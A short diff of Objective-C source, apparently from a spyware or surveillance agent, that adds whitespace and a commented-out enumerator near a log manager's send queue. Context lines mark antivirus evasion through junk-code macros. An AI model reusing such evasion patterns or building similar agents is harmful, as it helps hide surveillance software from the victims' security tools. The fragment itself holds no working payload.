@@ -286,6 +286,7 @@
   // AV evasion: only on release build
   AV_GARBAGE_006
   
+    
   NSEnumerator *first_enum = [logManager getSendQueueEnumerator];
     //TODO: check memory allocation
     NSArray *array = [first_enum allObjects];
@@ -316,6 +317,11 @@
     
   id anObject;
   
+    /*
+    NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
+    id anObject;
+    */
+
   // AV evasion: only on release build
   AV_GARBAGE_004
   
